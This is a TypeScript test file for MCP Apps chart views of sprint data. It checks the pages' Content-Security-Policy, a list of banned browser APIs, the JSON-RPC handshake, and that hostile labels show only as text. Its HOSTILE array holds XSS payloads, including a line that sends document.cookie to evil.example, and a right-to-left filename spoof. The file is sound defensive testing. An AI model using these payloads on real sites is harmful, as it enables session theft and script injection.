// SPDX-License-Identifier: Apache-2.0
// The MCP Apps views (P8-03, T27): the page's policy, what its script may use, the handshake, and above all that
// hostile Agility text can only ever become text (injection tests on labels).
import { describe, expect, it } from 'vitest';
import {
  APP_VIEWS,
  APPS_MIME_TYPE,
  clientSupportsApps,
  requestDeclaresApps,
  VIEW_RESOURCE_META,
  viewHtml,
} from '../../src/apps/index.ts';
import { VIEW_SCRIPT, VIEW_STYLE } from '../../src/apps/view-script.ts';
import { inventory, runView } from './fake-dom.ts';

const HOSTILE = [
  '<img src=x onerror=alert(1)>',
  '"><script>alert(1)</script>',
  "'; fetch('https://evil.example/?c='+document.cookie); //",
  '</title><svg onload=alert(1)>',
  'javascript:alert(1)',
  '${alert(1)}',
  '‮txt.exe',
];

describe('the script', () => {
  it('uses no markup string, code string, network, storage or navigation', () => {
    for (const banned of [
      'innerHTML',
      'outerHTML',
      'insertAdjacentHTML',
      'document.write',
      'eval(',
      'Function(',
      'setTimeout(',
      'setInterval(',
      'fetch(',
      'XMLHttpRequest',
      'WebSocket',
      'EventSource',
      'sendBeacon',
      'import(',
      'importScripts',
      'localStorage',
      'sessionStorage',
      'indexedDB',
      'document.cookie',
      'location',
      'window.open',
      'srcdoc',
      'DOMParser',
      'href',
    ]) {
      expect(VIEW_SCRIPT, banned).not.toContain(banned);
    }
    // It cannot close its own tag or open a comment inside the page.
    expect(VIEW_SCRIPT).not.toMatch(/<\/script|<!--/i);
    expect(VIEW_STYLE).not.toMatch(/<\/style|@import|url\(/i);
  });

  it('never targets a post to an origin it was not told (the host is the only peer, and `*` is the spec default)', () => {
    const run = runView(VIEW_SCRIPT, 'status-distribution');
    expect(run.sent.every((s) => s.target === '*')).toBe(true);
  });
});

describe('the page', () => {
  it.each(APP_VIEWS)(
    '$id: a policy that allows only its own script and style, and no network',
    async (view) => {
      const html = await viewHtml(view);
      const csp = /http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(html)?.[1] ?? '';
      expect(csp).toContain("default-src 'none'");
      expect(csp).toContain("connect-src 'none'");
      expect(csp).toContain("img-src 'none'");
      expect(csp).toContain("frame-src 'none'");
      expect(csp).toContain("object-src 'none'");
      expect(csp).toContain("base-uri 'none'");
      expect(csp).toContain("form-action 'none'");
      expect(csp).not.toMatch(/unsafe-inline|unsafe-eval|https?:|\*/);
      // The hashes are those of the exact text of the one script and the one style.
      const hash = async (text: string) =>
        btoa(
          String.fromCharCode(
            ...new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(text))),
          ),
        );
      expect(csp).toContain(`script-src 'sha256-${await hash(VIEW_SCRIPT)}'`);
      expect(csp).toContain(`style-src 'sha256-${await hash(VIEW_STYLE)}'`);
      expect(html.match(/<script/g)).toHaveLength(1);
      expect(html.match(/<style/g)).toHaveLength(1);
      expect(html).not.toMatch(/<(?:img|iframe|link|object|embed|form|base)\b|\son\w+=|src=|href=/i);
      expect(html).toContain(`<script>${VIEW_SCRIPT}</script>`);
      expect(html).toContain(`<style>${VIEW_STYLE}</style>`);
    },
  );

  it('is the same for every call and names no data', async () => {
    const [a] = APP_VIEWS;
    expect(a).toBeDefined();
    expect(await viewHtml(a as never)).toBe(await viewHtml(a as never));
  });

  it('declares no network, resource, frame or base domain to the host', () => {
    const meta = VIEW_RESOURCE_META['ui'] as { csp: Record<string, unknown[]> };
    for (const k of ['connectDomains', 'resourceDomains', 'frameDomains', 'baseUriDomains'])
      expect(meta.csp[k]).toEqual([]);
  });
});

describe('the handshake', () => {
  it('sends ui/initialize, answers its result with initialized, and ignores other senders', () => {
    const run = runView(VIEW_SCRIPT, 'sprint-burndown');
    expect(run.sent[0]?.message).toMatchObject({ jsonrpc: '2.0', id: 1, method: 'ui/initialize' });
    run.strangerSends({ jsonrpc: '2.0', id: 1, result: {} });
    expect(run.sent).toHaveLength(1);
    run.hostSends({ jsonrpc: '2.0', id: 1, result: { hostContext: {} } });
    expect(run.sent[1]?.message).toEqual({ jsonrpc: '2.0', method: 'ui/notifications/initialized' });
    run.hostSends({ jsonrpc: '2.0', id: 9, method: 'ui/resource-teardown', params: {} });
    expect(run.sent.at(-1)?.message).toEqual({ jsonrpc: '2.0', id: 9, result: {} });
  });

  it('does not draw for a stranger, a non-JSON-RPC message or a malformed result', () => {
    const run = runView(VIEW_SCRIPT, 'sprint-burndown');
    const before = run.root.textContent;
    run.strangerSends({
      jsonrpc: '2.0',
      method: 'ui/notifications/tool-result',
      params: { structuredContent: {} },
    });
    run.hostSends({ method: 'ui/notifications/tool-result', params: {} });
    run.hostSends('hello');
    run.hostSends(null);
    expect(run.root.textContent).toBe(before);
    run.hostSends({ jsonrpc: '2.0', method: 'ui/notifications/tool-result', params: { content: [] } });
    expect(run.root.textContent).toContain('no data to draw');
  });
});

const days = (n: number) =>
  Array.from({ length: n }, (_, i) => ({
    at: new Date(Date.UTC(2026, 9, 1 + i)).toISOString(),
    remaining: 40 - i * 4,
    itemCount: 10 - i,
    ideal: 40 - i * (40 / (n - 1)),
  }));

describe('sprint-burndown', () => {
  it('draws the series as an SVG with a data table', () => {
    const run = runView(VIEW_SCRIPT, 'sprint-burndown');
    run.hostSends({
      jsonrpc: '2.0',
      method: 'ui/notifications/tool-result',
      params: { structuredContent: { sprint: { name: 'Sprint 12' }, burndown: days(6) } },
    });
    const { tags, texts } = inventory(run.root);
    expect(tags).toEqual(expect.arrayContaining(['svg', 'path', 'table', 'details']));
    expect(texts).toContain('Sprint 12');
    expect(texts).toContain('10-01');
    expect(run.sent.at(-1)?.message).toMatchObject({ method: 'ui/notifications/size-changed' });
  });

  it('says so instead of drawing when there is no series', () => {
    const run = runView(VIEW_SCRIPT, 'sprint-burndown');
    run.hostSends({
      jsonrpc: '2.0',
      method: 'ui/notifications/tool-result',
      params: { structuredContent: { burndown: [] } },
    });
    expect(run.root.textContent).toContain('no burndown');
    expect(inventory(run.root).tags).not.toContain('svg');
  });

  it('drops points that are not a date and a number', () => {
    const run = runView(VIEW_SCRIPT, 'sprint-burndown');
    run.hostSends({
      jsonrpc: '2.0',
      method: 'ui/notifications/tool-result',
      params: {
        structuredContent: {
          burndown: [{ at: 'x', remaining: 1 }, { at: '2026-10-01T00:00:00Z', remaining: 'NaN' }, null, 7],
        },
      },
    });
    expect(run.root.textContent).toContain('no burndown');
  });

  it.each(HOSTILE)('shows a hostile sprint name as text only: %s', (name) => {
    const run = runView(VIEW_SCRIPT, 'sprint-burndown');
    run.hostSends({
      jsonrpc: '2.0',
      method: 'ui/notifications/tool-result',
      params: { structuredContent: { sprint: { name }, burndown: days(4) } },
    });
    const { texts, attributes, tags } = inventory(run.root);
    expect(texts).toContain(name);
    expect(attributes.some((a) => a.includes(name) || /alert|onerror|javascript:/i.test(a))).toBe(false);
    expect(
      tags.every((t) =>
        [
          'div',
          'h1',
          'span',
          'svg',
          'title',
          'line',
          'text',
          'path',
          'p',
          'table',
          'tr',
          'th',
          'td',
          'details',
          'summary',
          '#text',
        ].includes(t),
      ),
    ).toBe(true);
  });

  it('turns hostile numbers and dates into nothing, never into markup', () => {
    const run = runView(VIEW_SCRIPT, 'sprint-burndown');
    run.hostSends({
      jsonrpc: '2.0',
      method: 'ui/notifications/tool-result',
      params: {
        structuredContent: {
          burndown: [
            { at: '2026-10-01T00:00:00Z', remaining: '"><script>', ideal: '<b>' },
            { at: '2026-10-02T00:00:00Z', remaining: 3, ideal: 'x' },
            { at: '2026-10-03T00:00:00Z', remaining: '2' },
          ],
        },
      },
    });
    const { attributes } = inventory(run.root);
    for (const a of attributes) expect(a).not.toMatch(/[<>"]/);
    expect(inventory(run.root).tags).toContain('svg');
  });
});

describe('status-distribution', () => {
  it('draws one bar per category with our own labels for the known ones', () => {
    const run = runView(VIEW_SCRIPT, 'status-distribution');
    run.hostSends({
      jsonrpc: '2.0',
      method: 'ui/notifications/tool-result',
      params: {
        structuredContent: {
          byStatusCategory: [
            { category: 'completed', itemCount: 8 },
            { category: 'in_progress', itemCount: 5 },
            { category: 'not_started', itemCount: 2 },
          ],
        },
      },
    });
    const { tags, texts } = inventory(run.root);
    expect(tags.filter((t) => t === 'rect')).toHaveLength(3);
    expect(texts).toEqual(expect.arrayContaining(['Completed', 'In progress', 'Not started', '8', '5', '2']));
  });

  it.each(HOSTILE)('shows a hostile category name and sprint name as text only: %s', (name) => {
    const run = runView(VIEW_SCRIPT, 'status-distribution');
    run.hostSends({
      jsonrpc: '2.0',
      method: 'ui/notifications/tool-result',
      params: {
        structuredContent: {
          sprint: { name },
          byStatusCategory: [
            { category: name, itemCount: 3 },
            { category: 'constructor', itemCount: 1 },
          ],
        },
      },
    });
    const { texts, attributes } = inventory(run.root);
    expect(texts).toContain(name);
    expect(texts).toContain('constructor');
    expect(attributes.some((a) => a.includes(name))).toBe(false);
  });

  it('ignores negative and non-numeric counts', () => {
    const run = runView(VIEW_SCRIPT, 'status-distribution');
    run.hostSends({
      jsonrpc: '2.0',
      method: 'ui/notifications/tool-result',
      params: {
        structuredContent: {
          byStatusCategory: [
            { category: 'x', itemCount: -1 },
            { category: 'y', itemCount: 'many' },
          ],
        },
      },
    });
    expect(run.root.textContent).toContain('no status counts');
  });
});

describe('capability detection', () => {
  const caps = (mimeTypes: unknown) => ({ extensions: { 'io.modelcontextprotocol/ui': { mimeTypes } } });
  it('needs the extension with the HTML profile', () => {
    expect(clientSupportsApps(caps([APPS_MIME_TYPE]) as never)).toBe(true);
    expect(clientSupportsApps(caps(['text/html']) as never)).toBe(false);
    expect(clientSupportsApps(caps([]) as never)).toBe(false);
    expect(clientSupportsApps(caps('text/html;profile=mcp-app') as never)).toBe(false);
    expect(clientSupportsApps({} as never)).toBe(false);
    expect(clientSupportsApps(undefined)).toBe(false);
    expect(clientSupportsApps({ extensions: null } as never)).toBe(false);
    expect(
      clientSupportsApps({
        experimental: { 'io.modelcontextprotocol/ui': { mimeTypes: [APPS_MIME_TYPE] } },
      } as never),
    ).toBe(false);
  });

  it('reads a 2026-07-28 request envelope and nothing else', () => {
    const key = 'io.modelcontextprotocol/clientCapabilities';
    const msg = (c: unknown) => ({ jsonrpc: '2.0', method: 'tools/list', params: { _meta: { [key]: c } } });
    expect(requestDeclaresApps(msg(caps([APPS_MIME_TYPE])))).toBe(true);
    expect(requestDeclaresApps(msg(caps([])))).toBe(false);
    expect(requestDeclaresApps({ jsonrpc: '2.0', method: 'tools/list', params: {} })).toBe(false);
    expect(
      requestDeclaresApps({
        jsonrpc: '2.0',
        method: 'initialize',
        params: { capabilities: caps([APPS_MIME_TYPE]) },
      }),
    ).toBe(false);
    expect(requestDeclaresApps(null)).toBe(false);
    expect(requestDeclaresApps('x')).toBe(false);
  });
});
